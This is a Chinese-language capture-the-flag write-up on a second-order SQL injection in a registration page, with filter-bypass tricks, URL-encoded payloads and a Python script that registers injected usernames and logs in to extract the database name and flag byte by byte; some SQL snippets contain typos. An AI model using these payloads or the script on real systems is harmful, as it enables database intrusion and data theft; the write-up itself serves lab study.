# unfinished  SQL    WP_二次注入

来源：网鼎杯

http://61.147.171.105:58053/



##### 1.先扫一下目录：

![image-20251226182447696](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226182447696.png)

访问 `config.php` 是空白的

但是访问 `register.php` 有一个注册页面，注册之后可以登录：

![image-20251226182744280](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226182744280.png)

啥也没有。

还是需要登录高权限的，我猜测

> 其实不是，是二次注入

我在登录的页面尝试了很多，都没有注入点，就应该知道注入点该换地方了。

了解一下二次注入：

> #### 概述：
>
> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
> 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。
>
> ![image-20251226184217471](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226184217471.png)
>
> 

当我注册的时候把用户名换成：`'1 and'0`

登录进去就变成了：

![image-20251226185415869](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226185415869.png)

说明有二次注入！

成功注册，状态码302
注册失败，状态码200

> 在这里，注册的时候输入需要注入的语句，在登录的时候执行它。

所以我们就需要在注册的界面，用户名的地方进行SQL注入

用burp suite跑一遍，看看有没有过滤字符：

> “,”和“information”（ 无法通过类似x’ union select table_schema,table_name from information_schema.tables where table_schema=‘pikachu’#语句得到表名字）都被过滤掉了

```sql
’ union select table_schema,table_name from information_schema.tables where table_schema=‘pikachu’#
```

#### 注入语句实现方式：

```
SELECT '0'+'test'+'0'
```

直接输出0

如果再用一下hex:

```
SELECR '0'+hex('test')+'0'
```

输出：

```
test的hex值
```

但是如果是这样的：

```
SELECT '0'+hex('flag')+'0'
```

输出：

```
666C62167
```

在flag的hex值中存在字母，如果与0相加的话会存在截断的问题，所以我们应该二次hex，让最后的结果全部是数字：

```
SELECT '0'+hex(hex('flag'))
```

但是如果还有问题，要是结果超过10位的话，会转成科学计数法，导致丢失数据，所以需要

用substr来截，又因为这道题过滤了逗号，所以要用from for来绕过：

```
SELECT subtr(hex(hex'flag')) from 1 for 10)+'0'
```

还有之前的问题，就是过滤的还有 information，因此必须猜测表名是flag，

最终构成的payload：

```
email=test2%40qq.com&username=0'%2B(select hex(hex(database())))%2B'0&password=123456
```



```
email=test3%40qq.com&username=0'%2B(select substr(hex(hex((select * from flag))) from 1 for 10))%2B'0&password=123456
```





因为需要多次登录用户查看返回，所以我们需要写一个脚本：

```
import requests
import time
from bs4 import BeautifulSoup       #html解析器

def getDatabase():
    database = ''
    for i in range(10):
        data_database = {
            'username':"0'+ascii(substr((select database()) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }
        #注册
        requests.post("http://220.249.52.133:36774/register.php",data_database)
        login_data={
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }
        response=requests.post("http://220.249.52.133:36774/login.php",login_data)
        html=response.text                  #返回的页面
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]#获取用户名
        username=getUsername.text
        if int(username)==0:
            break
        database+=chr(int(username))
    return database

def getFlag():
    flag = ''
    for i in range(40):
        data_flag = {
            'username':"0'+ascii(substr((select * from flag) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }
        #注册
        requests.post("http://220.249.52.133:36774/register.php",data_flag)
        login_data={
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }
        response=requests.post("http://220.249.52.133:36774/login.php",login_data)
        html=response.text                  #返回的页面
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]#获取用户名
        username=getUsername.text
        if int(username)==0:
            break
        flag+=chr(int(username))
    return flag

print(getDatabase())
print(getFlag())
```



![image-20251226194417527](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251226194417527.png)